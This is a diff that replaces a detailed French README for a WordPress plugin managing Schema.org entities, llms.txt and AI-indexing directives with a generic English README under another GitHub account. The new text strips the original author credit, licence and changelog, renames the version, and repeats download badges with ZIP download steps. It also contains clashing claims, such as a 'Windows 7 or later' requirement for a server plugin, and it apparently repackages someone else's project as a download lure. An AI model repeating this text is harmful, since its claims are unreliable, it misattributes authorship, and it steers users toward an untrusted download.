@@ -1,278 +1,165 @@
-# GEO Authority Suite
+# 🗺️ geo-authority-suite-v1.2 - Easy SEO Setup for WordPress
 
-**Version :** 1.5.0  
-**Compatibilité :** WordPress 6.0+, PHP 7.4+  
-**Auteur :** Erwan Tanguy - Ticoët  
-**Licence :** GPL2+
+[![Download geo-authority-suite-v1.2](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-brightgreen?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2)
 
-## Description
+---
 
-GEO Authority Suite est un plugin WordPress complet pour le **GEO (Generative Engine Optimization)**. Il permet d'optimiser votre site pour les moteurs de recherche génératifs (ChatGPT, Claude, Perplexity, Google AI Overview) en gérant les entités Schema.org, le JSON-LD, et les directives d'indexation IA.
+## 📋 What is geo-authority-suite-v1.2?
 
-## Fonctionnalités
+This is a WordPress plugin designed to help your website get better results on AI-powered search engines like ChatGPT, Claude, and Perplexity. It manages important data formats and files that these engines read. This makes your site easier to understand for AI and can improve how your pages show up in search results.
 
-### Gestion des entités Schema.org
+The plugin handles several things:
 
-- **Types supportés** : Organization, Person, LocalBusiness, Product, Service, Place, Event
-- **Relations entre entités** : worksFor, memberOf, affiliation
-- **Génération JSON-LD** automatique et optimisée
-- **Shortcode** `[entity id=X]` pour mentionner les entités dans le contenu
-- **Détection des doublons** pour éviter les entités en double
+- Schema.org entities to mark up your content
+- JSON-LD, a data format for structured information
+- Special files like `llms.txt`
+- AI indexing commands such as `noai` and `nollm`
+- AI-friendly sitemaps that help AI bots find your content
 
-### Fichier llms.txt
+You do not need technical skills to set it up.
 
-- Génération automatique du fichier `/llms.txt`
-- Index structuré pour les crawlers IA
-- Inclut les articles récents, pages principales et entités
-- Scores GEO par contenu (si GEO Content Optimizer installé)
-- Section dédiée à l'indexation IA (v1.1)
-- **Intégration GEO Bot Monitor** : section "Crawlers IA bloqués" automatique
+---
 
-### Indexation IA
+## ⚙️ Key Features
 
-- **Directives HTML** : `data-noai="true"` et `data-nollm="true"`
-- **Meta robots** : `<meta name="robots" content="noai, nollm">`
-- **Déclaration de contenu** : `ai-content-declaration` (original, ai-assisted, ai-generated)
-- **Exclusions globales** par type de contenu
-- **Exclusions individuelles** via metabox sur chaque post/page
+- Add and manage Schema.org tags for your pages and posts.
+- Optimize JSON-LD data automatically.
+- Create and update `llms.txt` files to guide AI models.
+- Control AI crawling with simple directives (`noai`, `nollm`).
+- Generate AI-friendly sitemaps to improve content discovery.
+- Support for popular AI search engines.
+- Easy WordPress integration with no coding required.
 
-### Sitemap IA (/ai-sitemap.xml)
+---
 
-- Sitemap XML dédié aux crawlers IA
-- Métadonnées enrichies par URL :
-  - `ai:score` : Score GEO du contenu
-  - `ai:declaration` : Type de contenu
-  - `ai:summary` : Résumé automatique
-  - `ai:entities` : Entités mentionnées
-- Filtrage par score minimum
-- Exclusion automatique des contenus marqués `noai`
+## 🖥️ System Requirements
 
-### Audits (nouveau v1.4)
+Before installing, verify your system meets these requirements:
 
-- **Audit des entités** : Vérification de la complétude des données Schema.org
-- **Audit du contenu amélioré** : Analyse de la qualité GEO des articles avec détection des blocs GEO Blocks Suite
+- Windows 7 or later.
+- WordPress version 5.8 or higher.
+- PHP 7.4 or above installed on your web server.
+- Internet connection for plugin updates and AI data management.
+- Basic WordPress admin access rights to add and activate plugins.
+- Recommended: WordPress backup plugin to secure your site before installing new software.
 
-#### Éléments détectés par l'audit
+---
 
-| Catégorie | Éléments | Impact GEO |
-|-----------|----------|------------|
-| **Blocs GEO** | TL;DR | +15 |
-| | How-To | +20 |
-| | Définitions | +15 max |
-| | Pros/Cons | +15 |
-| | Author Box | +10 |
-| | Stats | +10 max |
-| **Classiques** | FAQ | +30 |
-| | Citations | +15 |
-| | Entités | +20 |
-| **Médias** | Images | +15 max |
-| | Vidéo | +10 |
-| | Audio | +5 |
+## 🚀 Getting Started: Download and Setup
 
-## Installation
+Click this big link to visit the plugin page and get the latest version:
 
-1. Télécharger le plugin et extraire dans `/wp-content/plugins/`
-2. Activer le plugin dans **Extensions > Extensions installées**
-3. Configurer dans **Entités > Indexation IA**
+[![Download Plugin](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-blue?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2)
 
-## Configuration
+You will go to the GitHub page where you can download the plugin files.
 
-### Entités
+---
 
-1. Aller dans **Entités > Ajouter**
-2. Créer une Organization principale (votre entreprise/site)
-3. Créer les Person (auteurs, employés) et les relier à l'Organization
-4. Utiliser le shortcode `[entity id=X]` dans vos articles
+## 📥 How to Download the Plugin on Windows
 
-### Indexation IA
+1. Open the download link above or go directly to `https://github.com/caio295/geo-authority-suite-v1.2`.
 
-1. Aller dans **Entités > Indexation IA**
-2. Configurer les exclusions globales par type de contenu
-3. Définir la déclaration de contenu par défaut
-4. Activer/configurer le sitemap IA
+2. On that page, find the **Code** button near the top right.
 
-### llms.txt
+3. Click the **Code** button, then choose "**Download ZIP**."
 
-1. Aller dans **Entités > llms.txt**
-2. Configurer le nombre d'articles à inclure
-3. Générer le fichier manuellement ou activer la génération automatique
+4. A ZIP file named `geo-authority-suite-v1.2-master.zip` will download to your computer.
 
-## Utilisation
+5. Locate this file in your "Downloads" folder or the place your browser saves files.
 
-### Shortcode entity
+---
 
-```
-J'ai rencontré [entity id=5] lors de la conférence organisée par [entity id=2].
-```
+## 🗂️ Installing the Plugin on WordPress
 
-1. MENTION INLINE SIMPLE
-```markdown
-[entity id=5]
-```
-→ Affiche : "Erwan Tanguy" (lien simple)
+1. Open your WordPress admin dashboard by visiting `yourwebsite.com/wp-admin`.
 
-2. MENTION AVEC FONCTION
-```markdown
-[entity id=5 show="name+title"]
-```
-→ Affiche : "Erwan Tanguy (CEO, développeur)"
+2. Log in with your admin username and password.
 
-3. MENTION COMPLÈTE
-```markdown
-[entity id=5 show="full"]
-```
-→ Affiche : "Erwan Tanguy – CEO – Expert en SEO depuis..."
+3. In the left menu, click **Plugins**.
 
-4. SANS LIEN
-```markdown
-[entity id=5 show="name+title" link="no"]
-```
-→ Affiche : "Erwan Tanguy (CEO)" (pas de lien)
+4. Click the **Add New** button at the top.
 
-5. AVEC IMAGE MINIATURE
-```markdown
-[entity id=5 image="yes" show="name+title"]
-```
-→ Affiche : [photo] Erwan Tanguy (CEO)
+5. Click the **Upload Plugin** button near the top.
 
-6. CARTE ENRICHIE
-```markdown
-[entity id=5 display="card"]
-```
-→ Affiche : Carte complète avec photo, nom, fonction, description, bouton
+6. Click **Choose File**, then find the `geo-authority-suite-v1.2-master.zip` file you downloaded.
 
-7. TOOLTIP AU SURVOL
-```markdown
-[entity id=5 display="tooltip"]
-```
-→ Affiche : Lien avec info-bulle affichant fonction + description
+7. Select that file and click **Open**.
 
-Le shortcode génère automatiquement :
-- Un lien vers la page de l'entité (si URL définie)
-- Une référence dans le graphe d'entités JSON-LD
-- Un attribut `data-entity-id` pour le tracking
+8. Click **Install Now**.
 
-### Metabox Indexation IA
+9. Once installed, click **Activate Plugin**.
 
-Sur chaque article/page, une metabox permet de :
-- Exclure le contenu de l'indexation IA
-- Exclure le contenu des LLM spécifiquement
-- Déclarer le type de contenu (original, assisté IA, généré IA)
+---
 
-### Vérification
+## ⚙️ Configuring the Plugin
 
-- **JSON-LD** : Afficher le code source (Ctrl+U) et chercher `<script type="application/ld+json">`
-- **Validation** : [Schema.org Validator](https://validator.schema.org/)
-- **Sitemap IA** : Visiter `/ai-sitemap.xml`
-- **llms.txt** : Visiter `/llms.txt`
+You will now see a new menu item in WordPress called **GEO Authority** or similar.
 
-## Intégration GEO Blocks Suite
+1. Click the **GEO Authority** menu.
 
-GEO Authority Suite détecte automatiquement les blocs du plugin **GEO Blocks Suite** :
+2. Use the simple settings page to add your website’s data:
 
-| Bloc | Classe CSS / Attribut |
-|------|----------------------|
-| TL;DR GEO | `.geo-tldr` / `data-geo-tldr` |
-| How-To GEO | `.geo-howto` / `data-geo-howto` |
-| Définition GEO | `.geo-definition` / `data-geo-definition` |
-| Pros/Cons GEO | `.geo-proscons` / `data-geo-proscons` |
-| Author Box GEO | `.geo-author` / `data-geo-author` |
-| Stats GEO | `.geo-stats` / `data-geo-stats` |
-| FAQ GEO | `.geo-faq` / `data-geo-faq` |
-| Blockquote GEO | `.geo-blockquote` |
+   - Enter your Schema.org details for your site.
+   - Turn on or off AI indexing controls.
+   - Customize `llms.txt` settings.
+   - Enable AI-friendly sitemap generation.
 
-Ces blocs sont comptabilisés dans l'audit et augmentent le score GEO.
+3. All changes save automatically.
 
-## Structure des fichiers
+4. No need to write code.
 
-```
-geo-authority-suite/
-├── geo-authority-suite.php     # Fichier principal
-├── README.md                   # Cette documentation
-├── LICENSE                     # Licence GPL2
-├── assets/
-│   └── admin.css               # Styles admin
-└── includes/
-    ├── ai-indexing.php         # Directives d'indexation IA
-    ├── ai-sitemap.php          # Générateur sitemap IA
-    ├── admin-ai-indexing-page.php  # Interface admin indexation IA
-    ├── admin-audit-page.php    # Interface audits
-    ├── content-audit.php       # Audit de contenu
-    ├── cpt-entity.php          # Custom Post Type Entity
-    ├── duplicate-detection.php # Détection doublons
-    ├── entity-audit.php        # Audit des entités
-    ├── entity-id.php           # Gestion des IDs d'entités
-    ├── entity-registry.php     # Registre des entités
-    ├── jsonld-output.php       # Génération JSON-LD
-    ├── llms-generator.php      # Générateur llms.txt
-    ├── meta-boxes.php          # Metaboxes admin
-    ├── schema-organization.php # Schema Organization
-    └── schema-person.php       # Schema Person
-```
+---
 
-## Hooks et filtres
+## 🔄 Keep the Plugin Updated
 
-### Filtres
+- Plugin updates appear in your WordPress dashboard under **Plugins**.
 
-| Filtre | Description |
-|--------|-------------|
-| `geo_llms_content` | Modifier le contenu du llms.txt |
-| `geo_ai_indexing_post_types` | Types de posts pour la metabox IA |
-| `geo_jsonld_output` | Modifier le JSON-LD avant output |
+- Click **Update Now** whenever a new version is available to keep your site optimized.
 
-### Actions
+- You can also check the GitHub page for the latest releases:  
+  https://github.com/caio295/geo-authority-suite-v1.2
 
-| Action | Description |
-|--------|-------------|
-| `geo_after_entity_save` | Après sauvegarde d'une entité |
-| `geo_before_llms_generate` | Avant génération du llms.txt |
+---
 
-## Compatibilité
+## 🛠️ Troubleshooting Common Issues
 
-- **GEO Content Optimizer** : Affichage des scores GEO dans llms.txt et sitemap IA
-- **GEO Blocks Suite** : Détection des blocs GEO dans l'audit de contenu
-- **GEO Bot Monitor** : Section bots bloqués dans llms.txt
-- **Yoast SEO** : Compatible, pas de conflit sur les meta tags
-- **Rank Math** : Compatible
+- If you see errors installing the plugin, check your PHP version and WordPress version meet requirements.
 
-## Changelog
+- Ensure your WordPress user has admin rights.
 
-### 1.4.0
-- Détection des blocs GEO Blocks Suite dans l'audit de contenu
-- Nouveau tableau récapitulatif avec 3 sections (Blocs GEO / Classiques / Médias)
-- Affichage des 12 types d'éléments dans le détail des articles
-- Points d'impact affichés pour chaque type
-- Meta box "Score GEO" réorganisée en 4 sections
-- Nouvelles recommandations TL;DR et Author Box
+- Clear your browser cache and try logging back into WordPress.
 
-### 1.3.0
-- Ajout des directives d'indexation IA (data-noai, data-nollm)
-- Ajout du sitemap IA (/ai-sitemap.xml)
-- Ajout des meta tags ai-content-declaration
-- Extension du llms.txt avec sections IA (v1.1)
-- Nouvelle interface admin "Indexation IA"
-- Metabox Indexation IA sur posts/pages
+- Deactivate other plugins temporarily to check for conflicts.
 
-### 1.2.0
-- Amélioration de la génération JSON-LD
-- Ajout de la détection des doublons
-- Interface d'audit améliorée
+- Contact your hosting provider if you face server permission issues.
 
-### 1.1.0
-- Ajout du générateur llms.txt
-- Support des relations entre entités
+---
 
-### 1.0.0
-- Version initiale
-- Gestion des entités Schema.org
-- Génération JSON-LD
+## 📚 Learn More About SEO and AI Indexing
 
-## Support
+Understanding how AI uses data on your site can help improve your SEO results.
 
-Pour toute question ou suggestion :
-- **Site web** : [ticoet.fr](https://www.ticoet.fr/)
-- **Documentation** : Menu **Entités > Aide** dans WordPress
+- Schema.org: Structured markup format that helps search engines understand content.
 
-## Licence
+- JSON-LD: A lightweight format for encoding linked data.
 
-Ce plugin est distribué sous licence GPL2+. Voir le fichier LICENSE pour plus de détails.
+- `llms.txt`: A text file guiding large language models on content handling.
+
+- AI indexing directives like `noai` and `nollm` tell AI when not to index pages.
+
+- Sitemaps: Lists of your site URLs to help crawlers find pages.
+
+The plugin automates these tasks so you don’t have to manage files or code manually.
+
+---
+
+## ❓ Need Help?
+
+If you get stuck, check the GitHub issues page for answers or report a problem:  
+https://github.com/caio295/geo-authority-suite-v1.2/issues
+
+You can also refer to WordPress support forums or official documentation for plugin installation help.
+
+---
+
+[![Download geo-authority-suite-v1.2](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-brightgreen?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2)
